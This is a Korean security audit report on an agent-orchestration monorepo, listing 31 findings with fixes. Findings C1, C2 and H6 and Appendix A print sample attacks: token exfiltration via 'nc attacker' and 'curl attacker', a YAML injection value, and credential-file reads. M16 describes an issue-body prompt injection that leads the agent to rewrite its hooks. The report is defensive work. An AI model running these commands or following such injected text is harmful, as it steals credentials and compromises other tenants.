# GitHub Symphony 리스크 감사 리포트

- **작성일**: 2026-07-06
- **범위**: 전체 모노레포 14개 패키지 (약 40k LOC, non-test)
- **방법**: 멀티에이전트 감사 — 서브시스템 6개 + 교차분석 3개 탐지 에이전트 병렬 실행 → 병합/중복제거 → 항목별 적대적 검증(refute-first) → 심각도 재보정
- **집계**: 원시 **153건** → 중복제거 **37건** → 검증 통과 **31건**
- **분류 기준**: ① 설계/구조 ② 보안 ③ 사용성 ④ 기타 개선
- **상태**: 검수 대기 (이슈 미발행)

> 상위 항목(C1·C2·H3·H4·H7)은 리뷰어가 코드로 직접 재확인함. 검증에서 24건 `confirmed`, 7건 `plausible`(단서 있음).

---

## 요약

| 심각도      | 건수   | 차원 분포                    |
| ----------- | ------ | ---------------------------- |
| 🔴 Critical | 2      | 보안 2                       |
| 🟠 High     | 13     | 보안 6 · 설계 6 · 사용성 1   |
| 🟡 Medium   | 10     | 설계 6 · 보안 2 · 사용성 2   |
| ⚪ Low      | 6      | 설계 5 · 사용성 1            |
| **합계**    | **31** | 보안 12 · 설계 15 · 사용성 4 |

핵심 테마:

1. **멀티테넌트 신뢰 경계·자격증명 스코핑 부재** — 신뢰할 수 없는 레포 설정(WORKFLOW.md)이 셸로 실행되고, 오케스트레이터의 전체 자격증명이 필터 없이 상속됨 (C1, C2, H1, H2, H5, M25).
2. **조정(Coordination) 계층의 상태 일관성/락 정확성** — PID-only 락, 비원자적 상태 쓰기, 크래시 복구 고착, 무신호 중단 (H7~H11, M18~M20, M24, M25).
3. **인증 없는 HTTP 상태 서버 노출** — `0.0.0.0` 바인딩 + 무인증 상태 조회/강제 실행 (H3, H14, M21).
4. **관측성 리댁션의 텍스트 누락** — 키 이름 매칭만 기본값, 텍스트에 박힌 토큰 누출 (H4, M17, M23).

---

## 🔴 Critical

### C1. WORKFLOW.md hook 명령이 검증·이스케이프 없이 `bash -lc`로 실행 — 보안 · confirmed

- **파일**: `packages/core/src/workspace/hooks.ts:48`
- **근거**: `spawn("bash", ["-lc", normalizedCommand], { env: { ...process.env, ...env } })`. hook 문자열은 레포별 WORKFLOW.md(`after_create`/`before_run`/`after_run`/`before_remove`)에서 로드되며, `normalizeHookCommand`(210–222)는 상대경로에 `bash ./`만 붙일 뿐 메타문자 검증·이스케이프가 전혀 없음. 오케스트레이터 전체 `process.env`(자격증명 포함)가 상속됨.
- **영향**: 악의적 WORKFLOW.md가 `after_create: "echo $GITHUB_GRAPHQL_TOKEN | nc attacker 1"` 로 토큰 탈취·레포 파괴·**동일 오케스트레이터를 공유하는 타 테넌트로의 횡적 이동**(RCE급).
- **권장**: 아래 **부록 A(C1 상세 해결안)** 참조. 요약 — ① 신뢰 게이트(신뢰된 WORKFLOW.md만 hook 실행) ② 실행 격리(샌드박스) ③ hook env 시크릿 스트립. C2는 argv-no-shell 고정.

### C2. WORKFLOW.md `agentCommand`를 다시 `bash -lc`로 감싸 셸 인젝션 — 보안 · confirmed

- **파일**: `packages/runtime-codex/src/runtime.ts:445-448`, `:475-478`
- **근거**: `config.agentCommand`(WORKFLOW.md 출처)에서 `bash -lc ` 접두만 벗겨 `args: ["-lc", shellCmd]`로 재-spawn, `...process.env` 스프레드. allowlist·이스케이프 없음.
- **영향**: `agentCommand: "codex; curl attacker/$(whoami)"` 로 워커 환경에서 임의 셸 실행 → RCE·시크릿 유출.
- **권장**: agentCommand를 argv 배열로 파싱해 셸 없이 spawn(조합 불필요, `codex app-server`). 승인된 실행파일 allowlist. process.env 전체 스프레드 지양.

> **주의(단일 사용자 배포에서도 유효)**: [start.ts:96-97](../packages/cli/src/commands/start.ts)이 `gh auth`로 받은 토큰까지 `process.env.GITHUB_GRAPHQL_TOKEN`에 심으므로, 로컬 키링 인증만 써도 hook이 토큰을 봄. 또한 M16 체인(이슈 본문 인젝션 → 에이전트가 WORKFLOW.md 수정 → 다음 런에서 hook 실행)으로 인해 솔로 배포에서도 위험이 남음.

---

## 🟠 High

### 보안

**H1. 토큰 캐시·MCP 설정 파일을 `0600` 없이 기록 — confirmed**
`packages/tool-github-graphql/src/tool.ts:112`, `packages/runtime-claude/src/mcp-compose.ts:44`. `writeFile(path, data, "utf8")`는 세 번째 인자를 인코딩으로 해석 → 기본 0o666(umask 후 0644, 월드리더블). 라이브 GitHub 토큰·broker secret이 파일에 평문 저장됨. → 공유/컨테이너 FS에서 co-tenant 프로세스가 자격증명 열람. **권장**: `{ mode: 0o600 }`, 부모 디렉터리 0700, 가능하면 env/broker로 전달해 디스크 기록 회피.

**H2. 오케스트레이터 전체 `process.env`를 워커·hook·툴에 필터 없이 상속 — confirmed**
`packages/orchestrator/src/service.ts:2792-2812`. `{ ...readProjectEnv, ...inheritedEnv(process.env 전체), ...explicitEnv }` — process.env가 프로젝트 .env를 덮어씀. 단일 `GITHUB_GRAPHQL_TOKEN`이 전 프로젝트 워커/hook에 무스코프로 전달 → 테넌트 격리 파괴. **권장**: 상속 env 키 allowlist(PATH/HOME/SHELL/TERM…), 워커별 short-lived scoped 토큰, credential-helper/broker 경유 전달.

**H3. HTTP 상태/대시보드/컨트롤플레인 서버가 `0.0.0.0`에 무인증 바인딩 — confirmed**
`packages/cli/src/commands/start.ts`(HTTP_HOST `0.0.0.0`), `packages/dashboard/src/server.ts`, `packages/control-plane/src/server.ts`. `GET /api/v1/state`로 활성 이슈·run ID·토큰사용량·워크스페이스 경로·세션 ID·lastError 노출, `POST /api/v1/refresh`로 무인증 강제 재조정(DoS). **권장**: 기본 바인드 `127.0.0.1`, `--bind-all` opt-in, 모든 `/api/v1/*`에 bearer/shared-secret 인증, 응답 필드 리댁션.

**H4. 관측성 리댁션이 기본 키 이름 매칭만 — confirmed**
`packages/core/src/observability/redaction.ts:26-38`. `redactObservabilitySecrets`가 `redactStringValues:false`로 호출 → 키 매칭만, free-form 문자열(에러/stderr/스택트레이스) 내부의 토큰은 통과. `fs-store.ts` `appendRunEvent`/`saveRun`이 이 기본 경로 사용. 텍스트 리댁터는 `ghp_`·`lin_`·`sk-`·`Authorization`·`TOKEN=` 패턴만 → `github_pat_`(fine-grained PAT)·`gho_`/`ghs_`·URL 내 토큰(`https://tok@host`)·커스텀 키명 미탐. → 에러 텍스트의 시크릿이 `.runtime` 이벤트에 저장되고 무인증 엔드포인트로 노출. **권장**: 영속화 전 free-form 필드(error/reason/message/stderr)에 텍스트 리댁션(`redactStringValues:true`) 적용, URL 임베드/고엔트로피/커스텀 키 탐지 확장, broker/API 에러를 일반 메시지로 소독.

**H5. broker/GraphQL URL에 SSRF·스킴 검증 없음 — confirmed**
`packages/runtime-codex/src/git-credential-helper.ts`, `packages/tool-github-graphql/src/tool.ts:91`, `packages/tool-linear-graphql/src/tool.ts:24`, `packages/runtime-codex/src/runtime.ts:716`. `tokenBrokerUrl`·`linearGraphqlUrl`·`githubGraphqlApiUrl`을 WORKFLOW.md/env에서 받아 Bearer 토큰과 함께 `fetch`하는데 https/호스트 검증 없음. → `http://`로 브로커 시크릿 평문 전송(MITM), 내부 IP/메타데이터 엔드포인트로 SSRF. **권장**: https 강제, DNS allowlist(`api.github.com`, `*.linear.app`), localhost/사설 IP 거부, 인증서 검증.

**H6. WORKFLOW.md/스킬 생성 시 YAML front matter를 문자열 접합으로 생성 — confirmed**
`packages/cli/src/workflow/generate-workflow-md.ts:56-69`. 사용자 제공 tracker endpoint/projectSlug를 이스케이프 없이 YAML에 보간. `--linear-project-slug "valid\nruntime:\n  command: malicious"` 로 runtime 섹션 재정의 → 워커가 비인가 설정 사용. **권장**: YAML 직렬화기 사용 또는 YAML-safe 이스케이프/쿼팅.

### 설계

**H7. 프로젝트 락이 PID 존재 여부만 확인(TTL 없음) — confirmed**
`packages/orchestrator/src/lock.ts:74`. `startedAt`은 저장만 하고 staleness 판정에 미사용. `isProcessRunning`은 `process.kill(pid,0)`만 — 신원 미확인. PID 재사용 시 정상 재시작이 "already running"으로 차단되어 수동 개입 필요. git 락(`git.ts` `LOCK_STALE_MS=30분`)은 mtime 기반 → 클록 스큐 취약, 행 클론 복구가 최대 30분 지연. `mkdir wx` 원자성 덕에 동시 실행 자체는 방지됨. **권장**: `startedAt` 기반 lease TTL, 프로세스 신원(cmdline) 확인 또는 OS flock/fcntl, heartbeat 갱신, `LOCK_STALE_MS` 축소/파라미터화.

**H8. `run-once`/`dispatch`가 파일 락 없이 issues.json을 load-modify-save — confirmed**
`packages/orchestrator/src/service.ts`(reconcile), `index.ts:167-184`(run-once/dispatch는 락 미획득), `fs-store.ts:202`(append fsync 없음), `:385`(rename fsync 없음). 두 프로세스가 같은 스냅샷을 로드→독립 변경→덮어쓰기 → 상태 유실/중복 디스패치. NDJSON append 무원자성 → 크래시 시 마지막 라인 잘림. `saveRun` 실패 미처리. **권장**: load-modify-save 전 구간 락 유지 또는 issues.json 낙관적 버전 체크, `run-once`/`dispatch`도 락 획득, rename 후 fsync, 이벤트 원자적 쓰기/체크섬, `saveRun` 실패 명시 처리.

**H9. 미완 턴 dirty-workspace 복구가 세션 메타데이터에 의존 — confirmed**
`packages/orchestrator/src/service.ts:2579`(`classifyIncompleteTurnDirtyWorkspace`). 복구 가능 판정을 `runtimeSession.status==='active'`·`exitClassification===null`에 의존. 워커가 파일 수정 후 세션 exit 저장 전 크래시하면 복구 경로 건너뜀 → 다음 런이 `allowDirtyExistingWorkspace=false`로 dirty 거부 → 이슈가 'running'에 영구 고착(미처리 예외로 사이클 크래시). **권장**: 런 시작 시 세션 메타 대신 실제 git status 검사, 워크스페이스 상태 검사와 세션 분류 분리.

**H10. 파일 트래커가 손상 JSON을 조용히 `[]`로 반환 — confirmed**
`packages/tracker-file/src/file-tracker-adapter.ts:72-74`. `JSON.parse` SyntaxError를 잡아 `[]` 반환 — "파일 손상"과 "이슈 없음"을 혼동. 손상 시 오케스트레이터가 "활성 이슈 0"으로 오인하고 **무신호로 디스패치 중단**. **권장**: ENOENT(→ `[]`)와 파싱 에러(→ 에러/로그 이벤트) 구분, 쓰기 측 tmp+rename로 부분 읽기 방지.

**H11. 멀티턴 refresh–턴 실행 레이스 + 도달 불가를 'keep running'으로 처리 — confirmed**
`packages/worker/src/index.ts:1625-1640`, `:1981-2005`. `refreshTrackerState`가 fetch 실패 시 `'unknown'` 반환, 루프는 `'active'|'unknown'`을 continue로 처리. 오케스트레이터 도달 불가 시 워커가 최대 maxTurns(기본 20)까지 무한 토큰 소모, 아웃티지 은폐. 워커별 lease/claim 부재 → 오케스트레이터 HA 전환 시 두 워커가 같은 이슈에 중복 부작용(PR/코멘트). 턴 사이 상태 전이 갭도 존재. **권장**: 각 턴 직전 short-lived lease 획득·실패 시 중단, refresh 에러는 연속 임계 후 fail-closed(`orchestrator_unavailable` 이벤트 + 비정상 종료).

**H14. 무제한/비정형 입력: POST 본문·Linear 페이지네이션·poll interval — confirmed**
`packages/control-plane/src/server.ts:201`(POST `/refresh` `request.resume()` 크기 무제한), `packages/tracker-linear/src/orchestrator-adapter.ts:295-340`(do-while 페이지네이션 max-page/타임아웃 없음), `service.ts:2915-2928`(`polling.intervalMs` min/max 클램프 없음). → 대용량 POST 힙 고갈(DoS), 대형 Linear 결과셋 무한 대기, `intervalMs≈0`으로 CPU 스핀 or 초대형값으로 폴링 사실상 비활성. **권장**: POST 본문 소량 상한, Linear maxPages+per-page 타임아웃, intervalMs 클램프.

### 사용성

**H15. 자격증명 소스 해석 혼란 + 인증 에러 문자열 매칭 분류 — confirmed**
`packages/cli/src/github/gh-auth.ts:419-452`(env 토큰 실패 삼키고 gh 에러만 표출, 둘 다 실패 시 gh 에러 버림), `:206-215`/`:298-313`(env 우선 불일치), `start.ts:179-208`(auth 에러를 `includes("status 401")` 등 문자열 매칭). → 만료된 env 토큰 사용자가 "gh auth 실패"를 보고 엉뚱한 재인증, 일시적 네트워크 오류가 auth 오분류되어 불필요 종료. **권장**: 연산별 사용 auth 소스 보고 + 둘 다 설정 시 경고, 시도한 모든 소스 실패를 에러에 포함, 문자열 매칭 대신 타입드 에러 클래스(`GitHubAuthError`/`GitHubScopeError`).

---

## 🟡 Medium

| #   | 제목                                                                                                                                                                        | 차원   | 검증      | 파일                                                                      |
| --- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------ | --------- | ------------------------------------------------------------------------- |
| M16 | 이슈 본문/WORKFLOW.md가 에이전트 프롬프트로 무가공 유입 — **의미적 프롬프트 인젝션 + Liquid 렌더 타임아웃 부재 DoS**. ("템플릿 인젝션" 주장은 반증: 값은 데이터로만 치환됨) | 보안   | plausible | `service.ts`, `packages/core/src/workflow/render.ts:223`                  |
| M17 | `doctor --json`/`--bundle`이 env 시크릿·에러 텍스트를 전체 리댁션 없이 캡처. (bundle 경로는 리댁션됨 → `--json` + API가 에러에 토큰 담을 때로 한정)                         | 보안   | plausible | `packages/cli/src/commands/doctor.ts:2677`                                |
| M18 | `stop` PID 파일 TOCTOU → PID 재사용 시 무관 프로세스 종료. spawn 실패 시 PID 파일 미정리                                                                                    | 설계   | confirmed | `packages/cli/src/commands/stop.ts:79`, `start.ts:1103`                   |
| M19 | GraphQL 메타데이터 무검증 + `stateFieldName` 미설정 시 전 이슈 'Unknown' 폴백 → 무신호 중단                                                                                 | 설계   | confirmed | `packages/tracker-github/src/adapter.ts:345`                              |
| M20 | GitHub GraphQL rate-limit 가드 check-then-sleep 레이스 → 동시성 하 API 버스트로 실제 429 유발                                                                               | 설계   | confirmed | `packages/tracker-github/src/adapter.ts:1495-1520`                        |
| M21 | HTTP 서버 보안 헤더 부재(X-Frame-Options/nosniff/CSP), 전체 에러 객체 로깅(경로 누출), charset 불일치                                                                       | 보안   | confirmed | `packages/control-plane/src/server.ts:309`, `dashboard/src/server.ts:117` |
| M22 | cleanup/hook/이벤트 핸들러 에러 삼킴 → 스테일 락 잔존, 삭제 실패에도 'removed' 마킹(디스크 누수), 관측성 이벤트 유실                                                        | 사용성 | confirmed | `packages/orchestrator/src/service.ts:3268`, `index.ts:117`               |
| M23 | 잘못된 WORKFLOW.md를 last-known-good로 조용히 폴백(1회 stderr, 이후 dedup으로 은폐)                                                                                         | 사용성 | confirmed | `packages/orchestrator/src/service.ts:3012-3067`                          |
| M24 | exit 분류에 `canceled_by_reconciliation` 분기 없음 → 의도적 취소가 'error'로 오분류(메트릭 오염)                                                                            | 설계   | confirmed | `packages/core/src/workflow/exit-classification.ts:31`                    |
| M25 | `.runtime`가 단일 디렉터리에 전 프로젝트 상태 저장, 권한 강제 없음(`projectDir()`가 projectId 무시) → 공유 배포 시 교차 프로젝트 읽기/손상                                  | 설계   | confirmed | `packages/orchestrator/src/fs-store.ts`                                   |

---

## ⚪ Low

| #   | 제목                                                                                                                          | 차원   | 검증      | 파일                                                         |
| --- | ----------------------------------------------------------------------------------------------------------------------------- | ------ | --------- | ------------------------------------------------------------ |
| L26 | 워크스페이스 경로 이탈 검사가 `/` 하드코딩·symlink 미인식(realpath 미적용) → Windows 워크스페이스 생성 DoS + symlink 시나리오 | 보안   | confirmed | `packages/core/src/workspace/safety.ts:10`, `identity.ts:75` |
| L27 | Claude 세션 resume이 stderr 4xx 정규식 의존 + 소유권 미검증. (prod에서 previousRunId 미사용 → 위험 제한적)                    | 설계   | plausible | `packages/runtime-claude/src/adapter.ts:219-283`, `:633-645` |
| L28 | 수렴 감지가 git HEAD를 레이스로 샘플링 + 수렴락 최대수명 없음. (타임스탬프 파싱 실패 엣지케이스로 한정)                       | 설계   | plausible | `packages/worker/src/convergence-detection.ts:67-149`        |
| L29 | approval/sandbox 기본값(`never`/`danger-full-access`)을 enum 검증 없이 수용 → 오타 시 조용히 permissive 동작                  | 사용성 | plausible | `packages/worker/src/codex-policy.ts:11-25`                  |
| L30 | config/token-usage/status 쓰기에 크로스프로세스 락 없음 → 동시 `config set` 유실, 토큰 아티팩트 무신호 유실                   | 설계   | plausible | `packages/cli/src/config.ts:171-180`                         |
| L31 | `IssueOrchestrationState` 전이 검증 부재(현재 호출부는 정상이나 리팩터링 리스크)                                              | 설계   | plausible | `packages/core/src/contracts/issue-orchestration.ts`         |

---

## Triage용 테마 클러스터 (Epic 후보)

1. **멀티테넌트 자격증명 스코핑** — C1, C2, H1, H2, H5, M25 (+ M17)
2. **HTTP 서버 노출** — H3, H14, M21
3. **조정계층 상태 일관성** — H7, H8, H9, H10, H11, M18, M20, M24, L30, L31
4. **관측성/리댁션** — H4, M23 (+ M17)
5. **입력 검증/DoS** — H6, H14, M16, L26, L29
6. **사용성/에러 표면화** — H15, M19, M22, M23

---

## 부록 A. C1 상세 해결안 (편의성 유지 전제)

취약점의 본질은 "로컬 인증 사용"이 아니라 **"신뢰할 수 없는 WORKFLOW.md가 임의 셸을 실행하고, 그 셸이 로컬 자격증명 저장소 전체에 접근한다"** 는 조합. 로컬 인증은 유지 가능.

**핵심 함의**: env에서 토큰만 스트립해도 부족 — hook이 임의 셸이면 `gh auth token`, `cat ~/.config/gh/hosts.yml`, `cat ~/.codex/auth.json`으로 우회. 따라서 두 축이 필수.

**축 A — 신뢰 게이트 (최우선, 편의성 훼손 최소)**: 신뢰된 소스(기본 브랜치·신뢰 커미터)의 WORKFLOW.md에서만 hook 실행. 외부 fork/PR 브랜치 hook은 skip 또는 명시 승인(pwn-request 방어). 레포별 1회 신뢰 승인(`--allow-hooks`).

**축 B — 실행 격리**: hook/에이전트를 컨테이너/샌드박스에서 실행해 호스트 크레드 저장소 접근 차단. 기존 codex `threadSandbox`(기본 `danger-full-access`, L29)를 조이고 컨테이너엔 scoped/broker 토큰만 주입.

**보조 — 자격증명 스코핑**: hook env 시크릿 키 allowlist 스트립. git은 이미 credential-helper(`runtime.ts:624`)로 공급되므로 hook에 raw 토큰 불필요.

**M16 체인 주의**: 이슈 본문 인젝션 → 에이전트가 WORKFLOW.md/hook 수정 → 다음 런 실행. 에이전트의 WORKFLOW.md/hook 자기수정 차단 또는 변경 시 재승인 필요.

### 방어 방식별 "다른 로컬 CLI 실행" 영향

| 방어 방식                 | 다른 CLI 실행        | 무엇이 깨지나                                                   |
| ------------------------- | -------------------- | --------------------------------------------------------------- |
| env 시크릿 스트립         | ✅ 전부 됨           | `$GITHUB_GRAPHQL_TOKEN`에 의존한 hook만                         |
| 신뢰 게이트               | ✅ 전부 됨           | 비신뢰 레포의 hook만 차단                                       |
| 커밋된 스크립트 allowlist | ✅ 전부 됨           | inline 문자열 금지, 스크립트 내부는 자유 (균형 최상)            |
| 샌드박스(컨테이너)        | ⚠️ 컨테이너 설치분만 | 호스트 `gh auth` 키링 비가시 → broker/scoped 토큰 필요          |
| argv-no-shell             | ⚠️ 단일 CLI만        | 파이프·`&&`·`$VAR`·glob·리다이렉트 상실. C2에 적합, hook엔 과함 |
| 메타문자 블록리스트       | ⚠️ 부분              | 정당한 조합도 차단 + 우회 여지 → 비추천                         |

**결론**: "다른 CLI 실행"을 근본 차단하는 건 argv-no-shell 뿐이며 그마저 단일 CLI는 실행됨(조합만 상실). 나머지는 CLI 실행에 영향 없음 → **편의성 유지하며 수정 가능**. 권장 조합: **C1 = 신뢰 게이트 + hook env 스트립 + 에이전트 자기수정 차단**, **C2 = argv-no-shell 고정**.

---

## 부록 B. 방법론 노트

- 탐지 에이전트 12개(서브시스템 9 + 교차분석 3), 각 4개 차원 전부 평가.
- 각 후보는 refute-first 적대적 검증(cited 코드 재확인, 기본값 = 회의) 통과 필요. `rejected` 또는 `isRealRisk=false`는 제외.
- 심각도는 검증 단계에서 재보정(예: M16 템플릿 인젝션 반증·의미적 인젝션/DoS로 재정의, L26 Windows DoS로 하향).
- 총 50 서브에이전트, 약 3.8M 토큰 소비.
